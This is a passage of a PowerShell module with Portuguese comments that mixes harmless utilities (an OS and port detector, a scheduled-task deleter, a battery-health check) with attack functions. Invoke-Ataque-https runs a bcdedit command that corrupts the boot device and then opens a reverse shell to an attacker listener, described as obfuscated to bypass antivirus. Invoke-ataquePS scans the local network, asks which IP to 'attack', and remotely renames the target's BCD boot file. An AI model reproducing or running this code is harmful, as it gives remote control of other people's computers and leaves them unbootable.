    elseif ($ports.ContainsKey("HTTP") -or $ports.ContainsKey("HTTPS")) {
        # Banner grabbing para mobile detection
        $httpPort = if ($ports["HTTP"]) { $ports["HTTP"] } else { $ports["HTTPS"] }
        try {
            $ua = "Mozilla/5.0 (Linux; Android 10)"
            $response = Invoke-WebRequest -Uri "http://$IP`:$httpPort" -UserAgent $ua -TimeoutSec 3 -UseBasicParsing -ErrorAction SilentlyContinue
            $server = $response.Headers['Server']
            if ($server -match "nginx|Apache.*Android|lighttpd.*mobile") {
                $os = "Android/iOS"
                $confidence = "Medium"
            }
        }
        catch {}
    }
    elseif ($ttlOS -eq "iOS/macOS") {
        $os = "Apple (iOS/macOS)"
        $confidence = "Medium"
    }
    
    return @{
        OS = $os
        Confidence = $confidence
        TTL = $ttlOS
        Ports = $ports
    }
}

# Execução principal
Clear-Host
Write-Host "=== DETECTOR AVANÇADO DE SO (TTL + 1000 PORTS) ===" -ForegroundColor Magenta
Write-Host "Alvo: $TargetIP" -ForegroundColor Yellow
Write-Host "=" * 60 -ForegroundColor Magenta

# Teste de conectividade
Write-Host "[-] Testando conectividade..." -ForegroundColor Cyan
if (-not (Test-Connection $TargetIP -Count 2 -Quiet)) {
    Write-Host "[!] AVISO: Host não responde ao ping (firewall?)" -ForegroundColor Red
    Write-Host "[+] Continuando com scan TCP..." -ForegroundColor Yellow
}

$osInfo = Detect-OSAdvanced -IP $TargetIP

Write-Host "`n[+] RESULTADO FINAL:" -ForegroundColor Green
Write-Host "  SO: $($osInfo.OS)" -ForegroundColor White
Write-Host "  Confiança: $($osInfo.Confidence)" -ForegroundColor White
Write-Host "  TTL Fingerprint: $($osInfo.TTL)" -ForegroundColor White

if ($osInfo.Ports.Count -gt 0) {
    Write-Host "  Portas Abertas ($($osInfo.Ports.Count)): $($osInfo.Ports.Keys -join ', ')" -ForegroundColor Cyan
} else {
    Write-Host "  Portas: Nenhuma das 1000 comuns encontrada (stealth?)" -ForegroundColor Yellow
}

Write-Host "`n[+] Scan completo! Execute como Admin para WMI/PowerShell Remoting." -ForegroundColor Green

	
}

function Invoke-tarefas-remove{
	
	# DELETOR FINAL - SEM ERROS DE SINTAXE
Clear-Host
Write-Host "=== DELETOR DE TAREFAS (UNICAS) ===" -ForegroundColor Green
Write-Host ""

# Lista UNICA de tarefas
$tarefasUnicas = @{}
$resultadoSchtasks = schtasks /query /fo LIST /v 2>$null
$linhasTarefa = $resultadoSchtasks | Select-String "^TaskName:"

foreach ($linha in $linhasTarefa) {
    $nomeTarefa = ($linha.Line -replace "^TaskName:\s*", "").Trim()
    if ($nomeTarefa -ne "" -and -not $tarefasUnicas.ContainsKey($nomeTarefa)) {
        $tarefasUnicas[$nomeTarefa] = $true
    }
}

$contador = 1
$listaNumerada = @{}
$tarefasUnicas.Keys | ForEach-Object {
    $listaNumerada[$contador] = $_
    Write-Host "$contador : $_" -ForegroundColor Cyan
    $contador++
}

Write-Host "`nTotal de tarefas UNICAS: $($contador-1)" -ForegroundColor Yellow

# Selecao
$selecionadas = @()
Write-Host "Exemplos: 1, 3-5, 1,4,7" -ForegroundColor Gray

while ($true) {
    $inputUser = Read-Host "`nDigite numeros (ou 'fim'): "
    if ($inputUser -eq "fim") { break }
    
    $partesInput = $inputUser -split ","
    $novosNums = @()
    
    foreach ($parte in $partesInput) {
        $parteLimpa = $parte.Trim()
        if ($parteLimpa -match "^(\d+)-(\d+)$") {
            $start = [int]$matches[1]
            $end = [int]$matches[2]
            for ($i = $start; $i -le $end; $i++) {
                if ($listaNumerada.ContainsKey($i) -and $selecionadas -notcontains $i) {
                    $novosNums += $i
                }
            }
        } elseif ($parteLimpa -match "^\d+$") {
            $num = [int]$parteLimpa
            if ($listaNumerada.ContainsKey($num) -and $selecionadas -notcontains $num) {
                $novosNums += $num
            }
        }
    }
    
    if ($novosNums.Count -gt 0) {
        $selecionadas += $novosNums
        Write-Host "Adicionado $($novosNums.Count) | Total: $($selecionadas.Count)" -ForegroundColor Green
    } else {
        Write-Host "Invalido!" -ForegroundColor Red
    }
}

if ($selecionadas.Count -eq 0) {
    Write-Host "Nada selecionado"
    Read-Host "Enter para sair"
    exit
}

# Confirmacao
Write-Host "`n=== A CONFIRMAR ===" -ForegroundColor Red
$listaFinal = @()
foreach ($numSel in $selecionadas) {
    $listaFinal += $listaNumerada[$numSel]
}

foreach ($tarefaFinal in $listaFinal) {
    Write-Host "  $tarefaFinal" -ForegroundColor Yellow
}

$confirmInput = Read-Host "`nDigite 'SIM' para DELETAR: "
if ($confirmInput -ne "SIM") {
    Write-Host "Cancelado"
    Read-Host "Enter para sair"
    exit
}

# EXECUCAO
Write-Host "`n=== DELETANDO ===" -ForegroundColor Red
$sucessos = 0
$naoEncontradas = 0

foreach ($tarefaUnica in $listaFinal | Select-Object -Unique) {
    Write-Host "$tarefaUnica ... " -NoNewline -ForegroundColor White
    $cmdResult = schtasks /delete /tn "`"$tarefaUnica`"" /f 2>&1
    
    if ($LASTEXITCODE -eq 0) {
        Write-Host "DELETADA" -ForegroundColor Green
        $sucessos++
    } else {
        Write-Host "NAO_ENCONTRADA" -ForegroundColor Gray
        $naoEncontradas++
    }
}

Write-Host "`n=== FINAL ===" -ForegroundColor Green
Write-Host "DELETADAS: $sucessos"
Write-Host "NAO_ENCONTRADAS: $naoEncontradas"
Read-Host "Enter para sair"

	
}

function Invoke-Ataque-https{
	
	# Script de ataque PowerShell para porta HTTPS (443) - Reverse Shell + bcdedit
# Autorizado para pentest - Executa bcdedit remotamente via HTTPS

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetIP,
    
    [Parameter(Mandatory=$false)]
    [int]$Port = 443,
    
    [Parameter(Mandatory=$false)]
    [string]$LHOST = "SEU_IP_AQUI",  # IP do seu listener
    
    [Parameter(Mandatory=$false)]
    [int]$LPORT = 4444              # Porta do seu listener
)

# Função para criar payload reverse shell via HTTPS
function Invoke-HTTPSReverseShell {
    param($Target, $Port, $LHOST, $LPORT)
    
    # Comando bcdedit específico a ser executado
    $bcdeditCmd = "bcdedit /set `{current`} device partition=Z:"
    
    # Payload PowerShell obfuscado para bypass AV/EDR
    $payload = @"
`$sm = New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);
`$st = `$sm.GetStream();
[byte[]]`$bt = 0..65535|%{0};
while((`$i = `$st.Read(`$bt, 0, `$bt.Length)) -ne 0){
    `$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bt,0, `$i);
    `$sb = (iex `$d 2>&1 | Out-String );
    `$sb2 = `$sb + 'PS ' + (pwd).Path + '> ';
    `$sendback = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes(`$sb2);
    `$st.Write(`$sendback,0,`$sendback.Length);
    `$st.Flush()};
`$sm.Close()
"@
    
    # Executa o comando bcdedit ANTES do reverse shell
    Write-Host "[+] Executando bcdedit: $bcdeditCmd" -ForegroundColor Green
    Invoke-Expression $bcdeditCmd
    
    # Aguarda 2 segundos para garantir execução do bcdedit
    Start-Sleep 2
    
    Write-Host "[+] Iniciando reverse shell para $LHOST`:$LPORT" -ForegroundColor Green
    Invoke-Expression $payload
}

# Verifica se está rodando como admin (necessário para bcdedit)
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[!] Elevando privilégios para executar bcdedit..." -ForegroundColor Yellow
    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoP -Exec Bypass -C `"& {$($MyInvocation.MyCommand.Definition)} -TargetIP $TargetIP -LHOST $LHOST -LPORT $LPORT`""
    exit
}

# Escaneia porta HTTPS antes do ataque
try {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.ReceiveTimeout = 3000
    $tcp.SendTimeout = 3000
    $connect = $tcp.BeginConnect($TargetIP, $Port, $null, $null)
    $wait = $connect.AsyncWaitHandle.WaitOne(3000, $false)
    if ($wait) {
        Write-Host "[+] Porta $Port aberta em $TargetIP - HTTPS detectado" -ForegroundColor Green
        $tcp.EndConnect($connect)
    } else {
        Write-Host "[-] Porta $Port fechada em $TargetIP" -ForegroundColor Red
        exit
    }
    $tcp.Close()
} catch {
    Write-Host "[-] Erro ao conectar em $TargetIP`:$Port" -ForegroundColor Red
    exit
}

# Executa o ataque
Write-Host "[*] Iniciando ataque HTTPS em $TargetIP`:$Port" -ForegroundColor Cyan
Invoke-HTTPSReverseShell -Target $TargetIP -Port $Port -LHOST $LHOST -LPORT $LPORT

	
}

function Invoke-ataquePS{
	
	# Script de Análise Real da Rede
# Autorizado para Penetration Testing

Write-Host "=== ANALISADOR DE REDE ===" -ForegroundColor Magenta

# Função para escanear IPs ativos
function Scan-Network {
    Write-Host "Analisando sua rede local..." -ForegroundColor Yellow
    
    # Obtém o IP local
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.PrefixOrigin -eq "Dhcp" -or $_.PrefixOrigin -eq "Manual"} | Select-Object -First 1).IPAddress
    
    if (!$localIP) {
        Write-Host "Erro: Não foi possível detectar seu IP local" -ForegroundColor Red
        return @()
    }
    
    Write-Host "Seu IP: $localIP" -ForegroundColor Green
    
    # Calcula a rede
    $ipParts = $localIP.Split('.')
    $networkBase = "$($ipParts[0]).$($ipParts[1]).$($ipParts[2])"
    Write-Host "Rede: $networkBase.0/24" -ForegroundColor Cyan
    Write-Host ""
    
    $activeIPs = @()
    Write-Host "Escaneando IPs 1-20..." -ForegroundColor White
    
    # Escaneia IPs de 1 a 20
    for ($i = 1; $i -le 20; $i++) {
        $targetIP = "$networkBase.$i"
        
        # Teste de ping
        $ping = New-Object System.Net.NetworkInformation.Ping
        $result = $ping.Send($targetIP, 500)
        
        if ($result.Status -eq "Success") {
            Write-Host "$targetIP - ATIVO" -ForegroundColor Green
            $activeIPs += $targetIP
        }
    }
    
    return $activeIPs
}

# INÍCIO DO SCRIPT
Clear-Host
Write-Host "=== ANALISADOR DE REDE ===" -ForegroundColor Magenta
Write-Host ""
    
# FASE 1: Análise da Rede
Write-Host "FASE 1: ANALISANDO SUA REDE" -ForegroundColor Green

$ips = Scan-Network

if ($ips.Count -eq 0) {
    Write-Host "Nenhum IP ativo encontrado na rede." -ForegroundColor Red
exit
}

Write-Host "`nIPS ATIVOS ENCONTRADOS:" -ForegroundColor Cyan
Write-Host "----------------------------------------" -ForegroundColor Cyan

for ($i = 0; $i -lt $ips.Count; $i++) {
    Write-Host "$($i+1). $($ips[$i])" -ForegroundColor White
}

Write-Host ""

# FASE 2: Seleção do Alvo
Write-Host "FASE 2: SELECIONAR ALVO" -ForegroundColor Green

do {
    Write-Host "Digite o número do IP que quer atacar:" -ForegroundColor Yellow
$choice = Read-Host "Numero"

if ($choice -ge 1 -and $choice -le $ips.Count) {
    $target = $ips[$choice-1]
    Write-Host "IP selecionado: $target" -ForegroundColor Green
    break
}
else {
    Write-Host "Número inválido. Digite entre 1 e $($ips.Count)" -ForegroundColor Red
}
} while ($true)

Write-Host ""

# FASE 3: Confirmação
Write-Host "Confirmar ataque em $target?" -ForegroundColor Yellow
$confirm = Read-Host "Digite S para SIM"

if ($confirm -eq "S" -or $confirm -eq "s") {
    Write-Host "Executando comando: ren bcd bcd.old" -ForegroundColor White


    Invoke-Command -ComputerName $target -ScriptBlock {
        ren bcd bcd.old
    }
    Write-Host "Comando executado com sucesso!" -ForegroundColor Green
}
else {
    Write-Host "Ataque cancelado" -ForegroundColor Yellow
}


Write-Host "`nScript finalizado" -ForegroundColor Magenta
	
}

function Invoke-battery-health{
	
	# Script seguro para vida útil da bateria
$battery = Get-WmiObject -Class Win32_Battery | Select-Object -First 1

if ($battery -and $battery.DesignCapacity -gt 0) {
    $designCapacity = $battery.DesignCapacity
    $fullChargeCapacity = $battery.FullChargeCapacity
    $currentPercent = $battery.EstimatedChargeRemaining
    
    $lifePercent = [math]::Round(($fullChargeCapacity / $designCapacity) * 100, 1)
    
    Write-Host "`n=== VIDA ÚTIL DA BATERIA ===" -ForegroundColor Cyan
    Write-Host "Vida útil: $lifePercent%" -NoNewline -ForegroundColor $(if($lifePercent -lt 70){'Red'}elseif($lifePercent -lt 85){'Yellow'}else{'Green'})
    
    if ($lifePercent -lt 80) {
        Write-Host " ⚠️  (Degradação detectada)" -ForegroundColor Red
    } else {
        Write-Host "" -ForegroundColor Green
    }
    
    Write-Host "Carga atual: $currentPercent%" -ForegroundColor Green
} else {
    Write-Host "❌ Dados de capacidade não disponíveis." -ForegroundColor Red
    Write-Host "   - Bateria não detectada"
    Write-Host "   - OU DesignCapacity = 0 (comum em alguns laptops)" -ForegroundColor Yellow
}

	
}
# Exportar todas as funções
Export-ModuleMember -Function Invoke-*